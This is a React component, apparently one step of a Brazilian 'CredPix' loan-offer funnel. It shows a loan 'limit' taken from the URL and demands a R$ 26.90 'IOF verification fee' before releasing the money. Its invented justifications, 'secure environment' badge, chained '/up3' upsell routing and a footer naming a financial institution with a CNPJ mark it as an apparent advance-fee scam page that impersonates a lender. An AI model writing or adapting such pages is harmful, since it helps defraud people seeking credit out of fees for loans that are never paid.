import { useNavigate, useSearchParams } from 'react-router-dom'

// ── Config ─────────────────────────────────────────────────────────────────────
const LOGO             = 'https://simuleoseucredito.com/emp/images/credpix-logo.png'
const VERIFICATION_FEE = 26.90

function fmtBRL(v) {
  return 'R$ ' + Number(v).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
}

// ── Icons ──────────────────────────────────────────────────────────────────────

const IcoCheckCircle = () => (
  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#16A34A" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
    <circle cx="12" cy="12" r="10" />
    <polyline points="9 12 11 14 15 10" />
  </svg>
)

const IcoCheckSmall = () => (
  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
    <polyline points="20 6 9 17 4 12" />
  </svg>
)

const IcoShieldCheck = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#16A34A" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
    <polyline points="9 12 11 14 15 10" />
  </svg>
)

// ── Reasons list ───────────────────────────────────────────────────────────────

const REASONS = [
  'Garante conformidade com as políticas da emissora',
  'Ajuda a evitar qualquer tipo de fraude',
  'Valida a autenticidade da operação',
]

function ReasonItem({ text }) {
  return (
    <li className="flex items-center gap-3">
      <span className="w-5 h-5 rounded-full bg-[#2563EB] flex items-center justify-center flex-shrink-0">
        <IcoCheckSmall />
      </span>
      <span className="text-gray-700 text-sm">{text}</span>
    </li>
  )
}

// ── Main component ─────────────────────────────────────────────────────────────

export default function UpsellTwo() {
  const [searchParams] = useSearchParams()
  const navigate = useNavigate()
  const loanAmount = Number(searchParams.get('valor')) || 5000

  function goPay() {
    const params = new URLSearchParams(window.location.search)
    params.set('fee', String(VERIFICATION_FEE))
    params.set('produto', 'Taxa de Verificação de IOF')
    params.set('next', '/up3')
    navigate(`/pagamento-upsell?${params.toString()}`)
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-[#1F3D20] py-4 flex items-center justify-center">
        <img src={LOGO} alt="CredPix" className="h-8 object-contain" />
      </div>

      <div className="max-w-xl mx-auto px-5 py-6">

        {/* Main card */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 mb-5">
          <h1 className="text-2xl font-extrabold text-[#1E3A5F] text-center leading-snug mb-2">
            Verificação de IOF
          </h1>
          <p className="text-gray-500 text-center mb-6">
            Confirme a taxa de verificação para concluir o processo
          </p>

          {/* Limite disponível */}
          <div className="bg-green-50 border-l-4 border-green-500 rounded-r-lg px-4 py-3.5 flex items-center gap-3 mb-4">
            <IcoCheckCircle />
            <div>
              <p className="font-bold text-green-700 text-sm mb-0.5">Limite disponível</p>
              <p className="text-green-700 font-extrabold text-2xl">{fmtBRL(loanAmount)}</p>
            </div>
          </div>

          {/* Taxa de verificação */}
          <div className="bg-blue-50 border border-blue-200 rounded-xl px-5 py-5 text-center mb-4">
            <p className="font-bold text-[#1E3A5F] mb-2">Taxa de verificação de IOF</p>
            <p className="text-gray-600 text-sm leading-relaxed mb-3">
              Para receber o saldo disponível, é obrigatório efetuar o pagamento da taxa de
              verificação de usuário. Essa taxa cobre o custo de todos impostos IOF.
            </p>
            <p className="text-[#2563EB] font-extrabold text-3xl">{fmtBRL(VERIFICATION_FEE)}</p>
          </div>

          {/* Por que é necessária */}
          <div className="bg-gray-50 border border-gray-100 rounded-xl p-4 mb-5">
            <p className="font-bold text-[#1E3A5F] mb-3">Por que essa taxa é necessária?</p>
            <ul className="flex flex-col gap-2.5">
              {REASONS.map(r => <ReasonItem key={r} text={r} />)}
            </ul>
          </div>

          <button
            onClick={goPay}
            className="w-full bg-[#2563EB] hover:bg-blue-700 text-white py-4 rounded-full font-bold text-base mb-4 transition-colors"
          >
            Efetuar verificação
          </button>

          <div className="flex items-center justify-center gap-2 text-sm text-gray-500">
            <IcoShieldCheck /> Ambiente Seguro
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="bg-[#1F3D20] py-8 text-center">
        <img src={LOGO} alt="CredPix" className="h-8 object-contain mx-auto mb-3" />
        <p className="text-white/80 text-sm">Simplic © 2025 Instituição Financeira</p>
        <p className="text-white/60 text-xs mt-0.5">CNPJ: 33.030.944/0001-60</p>
      </div>
    </div>
  )
}
